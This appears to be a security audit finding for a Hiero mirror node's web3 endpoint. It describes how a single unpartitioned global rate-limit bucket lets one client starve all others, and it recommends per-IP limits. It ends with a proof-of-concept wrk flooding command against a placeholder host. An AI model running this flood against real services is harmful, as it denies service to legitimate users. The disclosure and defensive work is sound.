### Title
Global Rate-Limit Bucket Starvation via Single-IP Request Flooding in `ThrottleManagerImpl.throttle()`

### Summary
`ThrottleManagerImpl.throttle()` checks a single application-scoped `rateLimitBucket` for every incoming request with no partitioning by source IP or caller identity. A single unprivileged attacker can saturate the entire global token bucket at the configured `requestsPerSecond` rate (default 500 req/s), causing every concurrent legitimate request to receive HTTP 429 for the duration of the attack. No credentials, keys, or special access are required.

### Finding Description
**Code path:**

`ThrottleConfiguration.rateLimitBucket()` instantiates one `Bucket` singleton with capacity equal to `throttleProperties.getRequestsPerSecond()` (default 500):

```
// ThrottleConfiguration.java lines 24-32
@Bean(name = RATE_LIMIT_BUCKET)
Bucket rateLimitBucket() {
    long rateLimit = throttleProperties.getRequestsPerSecond();
    final var limit = Bandwidth.builder()
            .capacity(rateLimit)
            .refillGreedy(rateLimit, Duration.ofSeconds(1))
            .build();
    return Bucket.builder().addLimit(limit).build();
}
```

`ThrottleManagerImpl.throttle()` calls `rateLimitBucket.tryConsume(1)` against this single shared bucket for every request, regardless of origin:

```
// ThrottleManagerImpl.java lines 37-42
public void throttle(ContractCallRequest request) {
    if (!rateLimitBucket.tryConsume(1)) {
        throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
    } else if (!gasLimitBucket.tryConsume(...)) { ... }
    ...
}
```

The `RequestFilter.FilterField` enum covers only `BLOCK`, `DATA`, `ESTIMATE`, `FROM`, `GAS`, `TO`, `VALUE` — there is no `IP` or `REMOTE_ADDR` field. No Spring Security filter, servlet filter, or any other layer in the throttle chain performs per-IP partitioning.

**Exploit flow:**
1. Attacker opens N concurrent HTTP connections (no auth needed) and fires requests at ≥500 req/s.
2. Each request calls `rateLimitBucket.tryConsume(1)`, draining all 500 tokens within the first second.
3. Every subsequent request from any other client hits `tryConsume(1) == false` and receives `ThrottleException` → HTTP 429.
4. The bucket refills at 500 tokens/s, but the attacker immediately re-drains it; legitimate users see sustained 429s.

**Why existing checks fail:**
- The `gasLimitBucket` check on line 40 is never reached once the rate bucket is empty.
- The `RequestProperties` filter chain (lines 44-48) is also never reached.
- There is no IP-keyed bucket map, no `ConcurrentHashMap<String, Bucket>`, and no reverse-proxy ACL enforced at this layer.

### Impact Explanation
Any unprivileged external user can render the web3 JSON-RPC endpoint completely unavailable to all other users for as long as the attack continues. The service returns HTTP 429 to all legitimate callers. Because the mirror node's web3 endpoint is a read-only EVM simulation service (no on-chain state), there is no direct financial loss, but full service denial constitutes a medium-severity griefing attack consistent with the scope classification.

### Likelihood Explanation
Preconditions: none beyond network access to the endpoint. The attack requires only a standard HTTP load tool (`wrk`, `ab`, `curl` in a loop). The default limit of 500 req/s is easily saturated from a single machine or a small botnet. The attack is repeatable indefinitely and requires no authentication, no special knowledge of the API, and no economic cost.

### Recommendation
Replace the single global `Bucket` with a per-IP bucket map, e.g. using Bucket4j's `ProxyManager` backed by a `ConcurrentHashMap` or a distributed cache:

```java
// Keyed by client IP extracted from HttpServletRequest / X-Forwarded-For
BucketConfiguration config = BucketConfiguration.builder()
    .addLimit(Bandwidth.builder()
        .capacity(perIpLimit)
        .refillGreedy(perIpLimit, Duration.ofSeconds(1))
        .build())
    .build();
ProxyManager<String> proxyManager = Bucket4jJCache.builderFor(cache).build();
Bucket bucket = proxyManager.builder().build(clientIp, config);
if (!bucket.tryConsume(1)) { throw new ThrottleException(...); }
```

Additionally, enforce a per-IP hard cap at the reverse-proxy/ingress layer (nginx `limit_req`, Envoy rate-limit filter) as a defense-in-depth measure independent of application-layer logic.

### Proof of Concept
```bash
# Saturate the global rate bucket from a single machine
wrk -t8 -c200 -d30s \
  -s <(echo 'wrk.method="POST"
              wrk.body="{\"data\":\"0xdeadbeef\",\"to\":\"0x0000000000000000000000000000000000000001\",\"gas\":21000}"
              wrk.headers["Content-Type"]="application/json"') \
  http://<mirror-node-host>/api/v1/contracts/call

# In a second terminal, observe that all requests from a different client return 429:
curl -s -o /dev/null -w "%{http_code}" \
  -X POST http://<mirror-node-host>/api/v1/contracts/call \
  -H 'Content-Type: application/json' \
  -d '{"data":"0xdeadbeef","to":"0x0000000000000000000000000000000000000001","gas":21000}'
# Expected output: 429
```

Expected result: while `wrk` runs, every independent `curl` call returns `429 Too Many Requests` with body `{"_status":{"messages":[{"message":"Requests per second rate limit exceeded"}]}}`. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L37-42)
```java
    public void throttle(ContractCallRequest request) {
        if (!rateLimitBucket.tryConsume(1)) {
            throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
        } else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
            throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
        }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java (L24-32)
```java
    @Bean(name = RATE_LIMIT_BUCKET)
    Bucket rateLimitBucket() {
        long rateLimit = throttleProperties.getRequestsPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(rateLimit)
                .refillGreedy(rateLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder().addLimit(limit).build();
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L34-35)
```java
    @Min(1)
    private long requestsPerSecond = 500;
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/RequestFilter.java (L39-49)
```java
    enum FilterField {
        BLOCK(ContractCallRequest::getBlock),
        DATA(ContractCallRequest::getData),
        ESTIMATE(ContractCallRequest::isEstimate),
        FROM(ContractCallRequest::getFrom),
        GAS(ContractCallRequest::getGas),
        TO(ContractCallRequest::getTo),
        VALUE(ContractCallRequest::getValue);

        private final Function<ContractCallRequest, Object> extractor;
    }
```
